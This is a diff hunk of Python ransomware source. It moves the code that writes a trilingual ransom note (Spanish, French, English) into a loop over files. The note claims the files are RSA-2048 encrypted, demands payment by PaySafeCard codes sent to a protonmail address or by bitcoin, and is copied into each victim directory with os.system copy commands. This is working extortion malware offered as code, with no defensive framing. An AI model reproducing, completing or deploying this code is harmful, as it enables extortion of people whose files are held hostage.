@@ -68,85 +68,83 @@ def crypt(text, pwd, path, bitcoin, price,verif ):
 				#pasamos en caso de error y/o acceso denegado
 				except (IOError, RuntimeError, TypeError, NameError, OSError):
 					pass
-
-
-			# Creamos archivo explicativo
-        		archivo = open("RECUPERAR_ARCHIVOS.rtf","wb")
-			archivo.write('hola te estaras preguntando que paso con tus archivos?\ntodos ellos fueron cifrados con RSA-2048\n')
-			archivo.write('si los quieres recuperar debes abonar :' + str(price) +'\n')
-			archivo.write("Puedes pagar con PaYSafeCard enviado los codigos de cupones al correo josegarciatorres@protonmail.com \n")
-			archivo.write("o enviar bitcoins a la direccion :#" + bitcoin+ "\n")
-			archivo.write("indicar su numero de expediente: 158465542F \n")
-			archivo.write("A continuacion te seran enviados la contraseña de desencrypcion y el manual explicativo para desencrypcion\n\n")
-			archivo.write("Ten mas cuidado la proxima vez !!!\n \n")
-			archivo.write('-------------------------------------------------------------- \n')
-			archivo.write('Bonjour, Tu te demande surment ce qu´il c´est passé avec tes fichiers ?\nTout tes dossiers - fichiers ont été cryptés avec RSA-2048\n')
-			archivo.write('si tu souhaite les recuperer tu doit payer :' + str(price) +'\n')
-			archivo.write("Tu peut payer par PaySafeCard en envoyant directement le code coupons a l'adresse: josegarciatorres@protonmail.com \n")
-			archivo.write("ou par bitcoin a l´adresse suivante :#" + bitcoin+ "\n")
-			archivo.write("Tu doit faire apparaitre ton nunmero de dossier: 158465542F \n")
-			archivo.write("Le mot de passe de decryptage ainsi que le manuel de decryptage te seront par la suite envoyé \n\n")
-			archivo.write("fait plus attention la prochaine fois !!!\n\n")
-			archivo.write('-------------------------------------------------------------- \n')
-			archivo.write('Hello, You wonder how it happened with your files? \nAll your files were encrypted with RSA-2048 \n ')
-			archivo.write('if you want to retrieve them you have to pay:' + str (price) + '\n')
-			archivo.write("You can pay by PaySafeCard by sending coupons directly to: josegarciatorres@protonmail.com \n")
-			archivo.write("or by bitcoin to the following address: #" + bitcoin + "\n")
-			archivo.write("Enter your file number: 158465542F \ n")
-			archivo.write("The decryption password and the decryption manual will be sent to you \n \n")
-			archivo.write("be careful next time !!! \n")
-			archivo.close()
-			# Arreglamos las dirrecciones de directorios para hacer copy/paste
-
-			text0=""
-			vari= os.path.splitext(i)[0]
-			vari2= (vari.split('\\', 1 )[0])
-			vari3= vari2.split('/')
-			vari4=''
-			
-			vari4= (vari.split('\\'))
-			for tex in vari3:
-				text0= (text0+tex+'\\')
-				if (verif != text0):
-					verif= text0
-					#Copy/Paste
-					try:
-						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\'+vari4[7]+'\\'+vari4[8]+'\\')
-					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
-						pass
-					try:
-						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\'+vari4[7]+'\\')
-					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
-						pass
-					try:
-						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\')
-					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
-						pass
-					try:
-						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\')
-					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
-						pass
-					try:
-						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\')
-					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
-						pass
-					try:
-						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\')
-					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
-						pass
-					try:
-						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\')
-					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
-						pass
-					try:
-						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\')
-					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
-						pass
-					try:
-						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+'\\')
-					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
-						pass
-			#Return la lista de directorios
+	for i in l:
+		# Creamos archivo explicativo
+        	archivo = open("RECUPERAR_ARCHIVOS.rtf","wb")
+		archivo.write('hola te estaras preguntando que paso con tus archivos?\ntodos ellos fueron cifrados con RSA-2048\n')
+		archivo.write('si los quieres recuperar debes abonar :' + str(price) +'\n')
+		archivo.write("Puedes pagar con PaYSafeCard enviado los codigos de cupones al correo josegarciatorres@protonmail.com \n")
+		archivo.write("o enviar bitcoins a la direccion :#" + bitcoin+ "\n")
+		archivo.write("indicar su numero de expediente: 158465542F \n")
+		archivo.write("A continuacion te seran enviados la contraseña de desencrypcion y el manual explicativo para desencrypcion\n\n")
+		archivo.write("Ten mas cuidado la proxima vez !!!\n \n")
+		archivo.write('-------------------------------------------------------------- \n')
+		archivo.write('Bonjour, Tu te demande surment ce qu´il c´est passé avec tes fichiers ?\nTout tes dossiers - fichiers ont été cryptés avec RSA-2048\n')
+		archivo.write('si tu souhaite les recuperer tu doit payer :' + str(price) +'\n')
+		archivo.write("Tu peut payer par PaySafeCard en envoyant directement le code coupons a l'adresse: josegarciatorres@protonmail.com \n")
+		archivo.write("ou par bitcoin a l´adresse suivante :#" + bitcoin+ "\n")
+		archivo.write("Tu doit faire apparaitre ton nunmero de dossier: 158465542F \n")
+		archivo.write("Le mot de passe de decryptage ainsi que le manuel de decryptage te seront par la suite envoyé \n\n")
+		archivo.write("fait plus attention la prochaine fois !!!\n\n")
+		archivo.write('-------------------------------------------------------------- \n')
+		archivo.write('Hello, You wonder how it happened with your files? \nAll your files were encrypted with RSA-2048 \n ')
+		archivo.write('if you want to retrieve them you have to pay:' + str (price) + '\n')
+		archivo.write("You can pay by PaySafeCard by sending coupons directly to: josegarciatorres@protonmail.com \n")
+		archivo.write("or by bitcoin to the following address: #" + bitcoin + "\n")
+		archivo.write("Enter your file number: 158465542F \ n")
+		archivo.write("The decryption password and the decryption manual will be sent to you \n \n")
+		archivo.write("be careful next time !!! \n")
+		archivo.close()
+		# Arreglamos las dirrecciones de directorios para hacer copy/paste
+		text0=""
+		vari= os.path.splitext(i)[0]
+		vari2= (vari.split('\\', 1 )[0])
+		vari3= vari2.split('/')
+		vari4=''
+		
+		vari4= (vari.split('\\'))
+		for tex in vari3:
+			text0= (text0+tex+'\\')
+			if (verif != text0):
+				verif= text0
+				#Copy/Paste
+				try:
+					os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\'+vari4[7]+'\\'+vari4[8]+'\\')
+				except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+					pass
+				try:
+					os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\'+vari4[7]+'\\')
+				except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+					pass
+				try:
+					os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\')
+				except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+					pass
+				try:
+					os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\')
+				except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+					pass
+				try:
+					os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\')
+				except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+					pass
+				try:
+					os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\')
+				except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+					pass
+				try:
+					os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\')
+				except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+					pass
+				try:
+					os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\')
+				except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+					pass
+				try:
+					os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+'\\')
+				except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+					pass
+		#Return la lista de directorios
 	return l
 
 # Variables para fichero explicativo
